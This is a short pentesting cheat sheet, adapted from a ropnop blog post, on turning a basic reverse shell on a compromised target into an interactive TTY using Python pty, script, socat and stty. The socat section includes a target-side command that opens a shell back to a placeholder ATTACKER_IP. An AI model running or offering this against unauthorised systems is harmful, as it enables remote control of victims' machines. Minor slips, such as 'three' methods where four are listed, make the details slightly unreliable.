# Upgrading Simple Shells to Fully Interactive TTYs

When you get a basic shell (e.g., via reverse shell), it often lacks features like tab completion, arrow keys, or job control. Here are three common ways to upgrade your shell to a fully interactive TTY.

---

## 1. Python PTY Spawn

If Python is available on the target:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
or for Python 3:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 2. Using `script` Command

If `script` is available:

```bash
script /dev/null -c bash
```

---

## 3. Socat PTY

If `socat` is available on both attacker and target:

**On the attacker's machine:**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:PORT
```

**On the target:**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
```

---

## 4. Magic
1. Examine the stty info so we can force the connected shell to match it:
    ```bash
    echo $TERM
    stty -a
    ```

2. Press `Ctrl+Z` to background the shell, then run the following on your local machine:
    ```bash
    stty raw -echo
    fg
    reset
    ```
3. To fix issues with terminal size, run:
    ```bash
    # From output of step 1.
    export TERM=xterm256-color 
    export SHELL=bash
    stty rows <num> columns <num>
    ```
- Now enjoy the fully interactive shell.

---

## Credits

Content adapted from: [ropnop - Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)